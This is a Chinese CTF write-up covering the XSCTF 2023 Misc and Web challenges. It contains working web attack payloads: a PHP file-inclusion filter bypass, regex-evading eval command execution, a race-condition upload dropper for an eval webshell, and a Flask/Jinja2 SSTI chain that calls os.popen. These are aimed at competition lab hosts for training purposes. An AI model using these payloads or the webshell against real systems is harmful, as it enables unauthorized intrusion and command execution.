---
title: 2023XSCTF初赛部分WP
date: 2023-10-18 00:05:22
tags:
  - CTF
  - Web
  - Misc
categories: CTF Write Up
cover: https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300008.jpg
description: 2023XSCTF招新赛Web，Misc部分WP
updated: 2023-10-19 22:07:36
---

献给，【打舞萌打的】。

第一次写wp，如有纰漏，还请多多见谅。

----

# Write Up

## Misc

### Mommy_Kafka

![image-20231014205025943](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205025943.png?x-oss-process=style/blog)

下载压缩包，解压。

![image-20231014205105049](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205105049.png?x-oss-process=style/blog)

发现有密码，但是题目没有给出任何和密码的信息。

![image-20231014205243055](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205243055.png?x-oss-process=style/blog)

压缩包内没有注释，于是考虑是伪加密。

用010Editor打开。

![image-20231014205505932](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205505932.png?x-oss-process=style/blog)

文件开头是PK，的确是一个压缩包，但是压缩文件数据区全局方式位标记为00 00，说明是没有加密的，那么本题一定是修改了压缩文件目录区的全局方式标记。搜索504B0102找到压缩文件目录区。

![image-20231014205735170](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205735170.png?x-oss-process=style/blog)

果然被修改过，将09 00改为00 00。保存，重新解压压缩包。

![image-20231014205844632](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205844632.png?x-oss-process=style/blog)

解压成功。

查看图片

![image-20231014205917775](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014205917775.png?x-oss-process=style/blog)

没有任何信息提示，考虑lsb隐写也没有找到有效信息。用010editor打开查看是否有其他信息隐藏在文件中。

![image-20231014210045282](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210045282.png?x-oss-process=style/blog)

发现文件末尾有隐藏信息，疑似base64加密。

丢进base解密脚本。

![image-20231014210152273](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210152273.png?x-oss-process=style/blog)

得到hint，使用steghide。

steghide是一款图片隐写软件，也可以反向解密出图片隐藏的信息，但是需要提供该图片加密时使用的密码。steghide虽然可以解密，但是没有提供爆破功能，所以需要使用脚本和自带字典或者第三方工具。

这里使用stegseek，需要在linux系统上运行，工具地址：[RickdeJager/stegseek: :zap: Worlds fastest steghide cracker, chewing through millions of passwords per second :zap: (github.com)](https://github.com/RickdeJager/stegseek)

![image-20231014210438034](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210438034.png?x-oss-process=style/blog)

爆破得到flag。

![3dc0ddaedf89a8baebc5b0bee200832](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/3dc0ddaedf89a8baebc5b0bee200832.png?x-oss-process=style/blog)

![aae182042b7630f38d57cdfbef07933](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/aae182042b7630f38d57cdfbef07933.png?x-oss-process=style/blog)

flag为`XSCTF{M0mmy_L0v3_Me_th3_mo5t}`

### Oursecret_for_zero

![image-20231015005909159](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015005909159.png?x-oss-process=style/blog)

下载附件，打开得到一个图片和txt文本文件。

![image-20231015005951989](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015005951989.png?x-oss-process=style/blog)

图片看似是一张普通的图片，其实是后面我们会用到的神奇妙妙工具。先看password.txt。

![image-20231015010124395](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015010124395.png?x-oss-process=style/blog)

确实很奇怪，这时候结合题目hint和信息，搜索零宽隐写，得到一个解密网站[Unicode Steganography with Zero-Width Characters (330k.github.io)](https://330k.github.io/misc_tools/unicode_steganography.html)。放入信息解密。

![image-20231015010531120](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015010531120.png?x-oss-process=style/blog)

得到hint：`Here is your passwd:A_n3w_ste9_way`。明显是有一个需要密钥的图片隐写在里面。

一开始我以为又是steghide，但是解析不出来，所以又回到题目。题目提示大写了OURSECRET，于是百度之。

![image-20231015010709588](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015010709588.png?x-oss-process=style/blog)

还真有这么个工具。于是下载好之后把图片拖进去输入密码后就可得到flag。

![image-20231015010818291](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015010818291.png?x-oss-process=style/blog)

![image-20231015010831232](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015010831232.png?x-oss-process=style/blog)

flag为：`XSCTF{WeLc0m3_to_s7eg_w0rld}`。

### 0xf and 0xf

![image-20231016133103503](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231016133103503.png?x-oss-process=style/blog)

下载附件，打开是一个加密编码的文本文件。



结合hint和题目名。两个0xf，就是两个十六进制。

搜索双十六进制解码

![image-20231016133316939](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231016133316939.png?x-oss-process=style/blog)

进入解密网站[Twin-Hex Cypher encoder and decoder from CalcResult Universal Calculators](https://www.calcresult.com/misc/cyphers/twin-hex.html)解密两次得到flag。（藏得太深了，受不了）

<img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231016133552996.png?x-oss-process=style/blog" alt="image-20231016133552996" style="zoom:50%;" />

<img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231016133605957.png?x-oss-process=style/blog" alt="image-20231016133605957" style="zoom:50%;" />

flag为`XSCTF{Cs3ome_13_pwn_k1ng}`。

## Web

### Hacker

![image-20231014210609801](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210609801.png?x-oss-process=style/blog)

进入网页

![image-20231014210630674](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210630674.png?x-oss-process=style/blog)

![image-20231014210637117](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014210637117.png?x-oss-process=style/blog)

查看页面源代码。

![image-20231014211006246](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211006246.png?x-oss-process=style/blog)

发现flag`XSCTF{Y0u_can_no7_f1nd_m3_?}`。

### ezgame

![image-20231014211056423](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211056423.png?x-oss-process=style/blog)

进入网站。

![image-20231014211121346](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211121346.png?x-oss-process=style/blog)

是一个部署在前端的小游戏，所以不用抓包，一般使用开发者模式在本地修改JS代码来达到目的。

总之先对JS代码进行审计，但是右键被禁用，应该是JS禁止了这个行为。所以用Ctrl+U打开页面源代码。

![image-20231014211358956](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211358956.png?x-oss-process=style/blog)

对其中的JS文件进行审计，搜索敏感词score。

![image-20231014211515918](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211515918.png?x-oss-process=style/blog)

太多了，搜索highscore。

![image-20231014211549074](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211549074.png?x-oss-process=style/blog)

发现敏感代码，在最高分大于1000000时执行。查看decryptString函数。

![image-20231014211631163](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211631163.png?x-oss-process=style/blog)

在Python中复现解密脚本，解出flag。

![image-20231014211728402](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211728402.png?x-oss-process=style/blog)

![image-20231014211736172](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211736172.png?x-oss-process=style/blog)

flag为`flag{basju_D0G006706_iajdisaia}`。

### canyoupassit

![image-20231014211826174](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211826174.png?x-oss-process=style/blog)

进入网站，发现是PHP审计。

![image-20231014211904126](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014211904126.png?x-oss-process=style/blog)

主要考察的是PHP下md5函数的特性。

对于第一关，要求post传参a1和b1不相同但是md5值相同，很经典的md5碰撞问题。我们这里可以MD5碰撞（MD5值以0e开头）也可以用php数组绕过。这里用md5碰撞，取`a1=QNKCDZO`与``b1=240610708`即可。

第二关要求post传参key值，使得其与自身md5值碰撞。这里是弱类型比较，本来想用数组绕过，但是网页不知道为什么无回显，于是继续使用0e碰撞，取`key=0e215962017`。

第三关要求post传参a2、b2，要求a2、b2不相同，且以\$now开头，且两者md5值强相等。这里的\$now是当前时间戳。手动传参肯定不行了，于是考虑用Python构造payload传参，脚本如下。

```py
import requests
import time

url="http://43.248.97.200:40038/"
t=str(int(time.time()))#获取当前时间戳
#print(str(t))

'''在a2、b2后加上两个数字使其不相同'''
a2=t+"0"
b2=t+"1"
#print(a2,b2)

'''构造payload'''
payload = {
    'a1': 'QNKCDZO',
    'b1': '240610708',
    'key': '0e215962017',
    'a2': a2,
    'b2': b2
}

response = requests.post(url, data=payload)

print(response.text)
```

值得一提的是，本来这里我也打算用a2和b2数组绕过的，但是不知道为什么又没有回显。百无聊赖之际把数组去掉试试，没想到竟然爆了flag，理论上第三个md5函数应该通不过的啊，难道md5函数处理字符数有上限？自动截取了前十个时间戳转换吗。

总之成功解出flag。



![image-20231014213426176](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014213426176.png?x-oss-process=style/blog)

flag为`flag{y0v|nDeedReA11yk$nwAb0uTMD5!~_~^_^}`。

### reallyExpensive

![image-20231014213532015](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014213532015.png?x-oss-process=style/blog)

进入网址

![image-20231014213556378](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014213556378.png?x-oss-process=style/blog)

是一个简陋的登录页面，猜想sql注入或者弱口令，但是先稳一手注册。

![image-20231014213651989](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014213651989.png?x-oss-process=style/blog)

![image-20231014213704013](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014213704013.png?x-oss-process=style/blog)

没想到直接进了。

这里我要严重吐槽一下出题人，环境搭的有问题。本题容器在火狐上打开有bug。

![2ffc2683318716e5b583bcdf84a3062](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/2ffc2683318716e5b583bcdf84a3062.png?x-oss-process=style/blog)

然后我偏偏hackbar和bp都配在火狐上，导致我死活进不去抓包，浪费了起码几个小时。最后用bp自带的浏览器打开，进入抓包。

![image-20231014214206343](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014214206343.png?x-oss-process=style/blog)

![image-20231014214226792](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014214226792.png?x-oss-process=style/blog)

这里post了两个参数number和goodId，很容易联想到后端的计算方法应该是用金额数减去数量乘以价格来判断是否购买成功，于是修改number为负数，就可以购买flag5了。

![image-20231014214350464](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014214350464.png?x-oss-process=style/blog)

![image-20231014214424659](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014214424659.png?x-oss-process=style/blog)

得到flag，且余额增加了999999999，验证了我之前的猜想。

flag为`flag{^==^Y0uG@t$(t]$[r)^u^(e)-F10g!^<>^}`。

### Badbad_filename

![image-20231014214539599](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014214539599.png?x-oss-process=style/blog)

进入容器

![image-20231014215023822](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215023822.png?x-oss-process=style/blog)

题目暗示很明显，用get传参filename，然后后者会被文件包含，经典的文件包含漏洞题，联想到使用PHP伪协议，于是构造payload为`/?filename=php://filter/convert.base64-encode/resource=index.php`

![image-20231014215306191](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215306191.png?x-oss-process=style/blog)

被过滤了，但是只是单纯的从语句中去掉了过滤词，使用双写绕过。

构造payload`/?filename=pphphphpp://filtfilterer/convert.babasese64-encode/resource=index.pphphphpp`。

![image-20231014215428340](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215428340.png?x-oss-process=style/blog)

payload有效，得到index.php的源代码，送进CyberChef解密。

![image-20231014215521978](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215521978.png?x-oss-process=style/blog)

可以看到index文件开头执行了flag.php，于是构造payl为`pphphphpp://filtfilterer/convert.babasese64-encode/resource=flag.pphphphpp`直接查看flag，再解码即可。

![image-20231014215636748](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215636748.png?x-oss-process=style/blog)

![image-20231014215701209](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215701209.png?x-oss-process=style/blog)

得到flag`XSCTF{d0ubLe_Wr1te_2_byPass}`。

### eval_eval_我的

![image-20231014215750403](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215750403.png?x-oss-process=style/blog)

进入容器

![image-20231014215810981](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215810981.png?x-oss-process=style/blog)

又是一道PHP代码审计题

题目要求get传参xsctf，且用正则过滤黑名单。如果通过则再检验post传参Xp0int和Sloth，要求两参数不相同但md5值强相等，如果通过则执行eval函数。这题要在正则过滤的限制下利用文件执行漏洞执行xsctf获得flag。

首先考虑参数Xp0int和Sloth，用数组绕过即可。post传参`Xp0int[]=0&Sloth[]=1`即可。

接下来考虑如何绕过正则来执行文件。

构造payload为

```
/?xsctf=echo(`ls`);
```

因为过滤了空格，用`echo()`来绕过。同时用反引号\`\`，在PHP中会把echo反引号内的内容当做PHP代码执行，效果如下。

![image-20231014220943778](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014220943778.png?x-oss-process=style/blog)

无敏感文件，继续查看上一级目录。构造payload：

```
/?xsctf=echo(`ls\x20/`);
```

用\\x20来绕过空格，\\x20在PHP中被解释为空格，得到以下结果。

![image-20231014221507041](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014221507041.png?x-oss-process=style/blog)

发现flag，查看文件。构造payload：

```
/?xsctf=echo(`ca''t\x20/fl''ag`);
```

使用双单引号绕过正则匹配，得到flag。

![image-20231014221740959](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014221740959.png?x-oss-process=style/blog)

flag为`XSCTF{YoU_F1NalLy_EvaLLL_m3!!}`。

### upload_quick

![image-20231015131246415](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131246415.png?x-oss-process=style/blog)

开启容器

![image-20231015131312723](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131312723.png?x-oss-process=style/blog)

是一个登录界面，尝试输入账户密码登录。

![image-20231015131347330](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131347330.png?x-oss-process=style/blog)

无论输入什么都会被弹窗打断，没有任何反应。同时发现右键被禁用，于是Ctrl+U查看源代码。

![image-20231015131516279](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131516279.png?x-oss-process=style/blog)

大概的意思是，无论在登录框执行什么操作都会被打断。于是开始查看其他方面，同时发现四个可疑JS文件，查看之。

![image-20231015131633889](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131633889.png?x-oss-process=style/blog)

其中EasePack.min.js很明显经过了混淆，使用在线工具网站[JS/HTML格式化 - 站长工具 (chinaz.com)](https://tool.chinaz.com/Tools/JsFormat.aspx)来反混淆。

![image-20231015131750553](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131750553.png?x-oss-process=style/blog)

复制到本地查看。

![image-20231015131835200](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131835200.png?x-oss-process=style/blog)

代码末尾发现hint，根据提示访问/Upl00000000ad.php。

![image-20231015131944047](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131944047.png?x-oss-process=style/blog)

发现是一个文件上传页面，从这里可以确定这道题其实是一个文件上传漏洞题。

上传测试木马。

![image-20231015132036657](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015132036657.png?x-oss-process=style/blog)

木马被检测到，同时返回了一个文件上传的地址，访问。

![image-20231015132156329](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015132156329.png?x-oss-process=style/blog)

下载图片打开，发现内容并没有被更改。

![image-20231015132346619](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015132346619.png?x-oss-process=style/blog)

<div align=center >下载下来被火绒秒删……说明是我写的木马没错</div>

既然写入的一句话木马没有被修改，尝试用蚁剑连接webshell，连接失败，说明文件没有被执行，所以上传图片马的方法也可以排除了。

既然php后缀被拦截，抓包修改文件名试试上传其他的文件后缀。

![image-20231015132744364](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015132744364.png?x-oss-process=style/blog)

![image-20231015132833820](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015132833820.png?x-oss-process=style/blog)

经过实验，只有图片格式后缀不被拦截，确定拦截方式为白名单。尝试使用%00截断绕过。

![image-20231015133056288](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015133056288.png?x-oss-process=style/blog)

绕过失败。

此时只剩下一种方法，条件竞争。条件竞争，就是把文件上传到服务器，而服务器判断文件是否合法需要时间，在此时访问上传的木马文件，就可以实现植入后门的操作。当然，这样要求的时间很短速度很快，仅凭手速是达不到的，我们需要不断的上传木马文件同时发送访问请求，这与题目名upload_quick不谋而合。至此，基本可以确定是条件竞争上传。

要确定一个题目是条件竞争，我们首先要知道文件上传的位置才能进行访问。这里虽然每次返回的都是一串随机字符文件名，但都是在uploads文件夹下，所以我们大胆猜测上传的文件会被暂时储存在uploads下，如果服务器判定文件非法则会修改其文件名和文件后缀返回给用户。也就是说，我们要不断地上传木马文件的同时，不断的访问uploads/xxx.php。

那么准备工作开始。

首先准备条件竞争的木马。

```php
<?php
$a='PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+';
$myfile = fopen("shell.php", "w");
fwrite($myfile, base64_decode($a));
fclose($myfile);
?>
```

主要的功能是如果木马被执行/访问成功，则写入另一个木马shell.php，这样即使自己被删掉也可以留下一个后门。

这里需要写入的内容使用了base64加密，原因是如果你直接将\$a=一句话木马，生成的文件中将不会含有$_POST['xxx'] ，所以我们需要使用base64加密。

接下来准备bp爆破，不断地向服务器上传木马文件，将上传文件的数据包抓包发送给intruder模块。

![image-20231015134611264](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015134611264.png?x-oss-process=style/blog)

尽管后面使用**Null payload**，但仍然需要**设定一个变量**。而且这个变量最好是空格作为变量。如果随意选取一个变量，他会把你的变量变成空。

![image-20231015134740689](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015134740689.png?x-oss-process=style/blog)

payload配置类型为**Null payload**，并无限重复发送。

![image-20231015134801650](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015134801650.png?x-oss-process=style/blog)

这里本来还应该开启多线程上传增加成功率，但是我的bp版本没有多线程的功能，所以我开启了两个bp同时上传文件，配置方法相同。

最后是Python监听脚本，用来不断的发送访问请求，同时监听是否访问成功，脚本代码如下：

```python
import requests

url = "http://43.248.97.200:40037/uploads/tiaojian3.php"
while True:
    html = requests.get(url)
    if html.status_code == 200:
        print("YES,you upload it!")
    else:
	    print("NO")
```

万事俱备只欠东风，启动bp爆破和Python监听脚本。

![image-20231015135140655](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015135140655.png?x-oss-process=style/blog)

![image-20231015135231566](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015135231566.png?x-oss-process=style/blog)

成功访问，此时用蚁剑尝试链接webshell。

![image-20231015135347012](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015135347012.png?x-oss-process=style/blog)

连接成功，翻看目录找到flag。

![image-20231015135443813](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015135443813.png?x-oss-process=style/blog)

flag为`XSCTF{1iL3_UP1oOOO0oOO4d_In7ereS7iNG_fe2accc0eed4}`。

### 你买车票没

![image-20231015162100798](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015162100798.png?x-oss-process=style/blog)

最mhy的一集……首先进入容器。

![image-20231015162205624](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015162205624.png?x-oss-process=style/blog)

一个简陋的登录页面，十分简陋，查看源代码也没有发现有价值的信息。尝试抓包，同样没有什么进展。不管输入什么，都会弹出窗口显示没有车票。

![image-20231015162323357](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015162323357.png?x-oss-process=style/blog)

尝试SQL注入，用sqlmap扫了两小时无果，于是考虑SSTI模板注入。

传入参数{{7*7}}，返回49，说明改题存在SSTI注入漏洞，注入点为用户名/name。

![image-20231015162511752](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015162511752.png?x-oss-process=style/blog)

做题思路如下：

> 通过python的对象的继续来一步步实现文件的读取和命令执行的
> 首先用__class__读取当前类对象的类
> 然后用__mro__或者__base__寻找基类
> 然后用__subclasses__找命令执行或者文件操作的模块
> 然后使用__init__声明
> 然后使用__globals__引用模块
> ————————————————
> 原文链接：https://blog.csdn.net/weixin_46342884/article/details/123246354

我们按照这个思路一步步做题。

首先传入{{7*7}}测试确实存在SSTI注入，我们已经做过了。

然后，读取当前字符的类

```
?name={{config.__class__}}
```

![image-20231015163336358](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015163336358.png?x-oss-process=style/blog)

这一坨乱码是HTML编码，我们暂时不用管它，不过为了方便阅读起见，我把解码后的文本丢在这里`<class 'flask.config.Config'>,`。

接着我们查找基类，构造如下：

```
?name={{config.__class__.__mro__}}
```

![image-20231015163540505](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015163540505.png?x-oss-process=style/blog)

`(<class 'flask.config.Config'>, <class 'dict'>, <class 'object'>)`

继续选择基类查找命令执行或者文件操作的模块：

```
?name={{config.__class__.__mro__[2].__subclasses__()}}
```

因为这里object在第三位，而python是从0开始计数的所以写2，为什么选择object，因为它是所有类的父类，默认所有的类都继承至Object类。

![image-20231015163744611](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015163744611.png?x-oss-process=style/blog)

得到的内容有亿点点多……

首先把它们全部转为HTML格式，然后扔Python跑脚本。

```python
'''此处省略亿点点内容'''
s='''?id=[<class 'type'>, <class 'weakref'>, ...., <class 'werkzeug._reloader.ReloaderLoop'>],没买车票不能上车!!!");'''

s=s.split(', ')
with open("ssti查找结果.txt","w") as p:
    for i in s:
        p.write(i+"\n")
```

然后去新的文本文件里查找要用的模块popen。

![image-20231015164139328](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015164139328.png?x-oss-process=style/blog)

第352个，减一就是第351个数组元素。

最后引用模块执行命令。

```
?name={{config.__class__.__mro__[2].__subclasses__()[351].__init__.__globals__['os'].popen('ls').read()}}
```

![image-20231015164848512](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015164848512.png?x-oss-process=style/blog)

回显直接不见了，好家伙，原来在源码里。

![image-20231015164915434](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015164915434.png?x-oss-process=style/blog)

发现flag，构造payload得到flag。

```
?name={{config.__class__.__mro__[2].__subclasses__()[351].__init__.__globals__['os'].popen('cat+flag').read()}}
```

如果是在name框里传参直接把`cat+flag`改成`cat flag`就好。

![image-20231015165314336](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015165314336.png?x-oss-process=style/blog)

flag为`XSCTF{SsT1_MilKTea_m1LktEa!}`

----

完结线！撒花~✿✿ヽ(°▽°)ノ✿。

![300008](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300008.jpg?x-oss-process=style/blog)
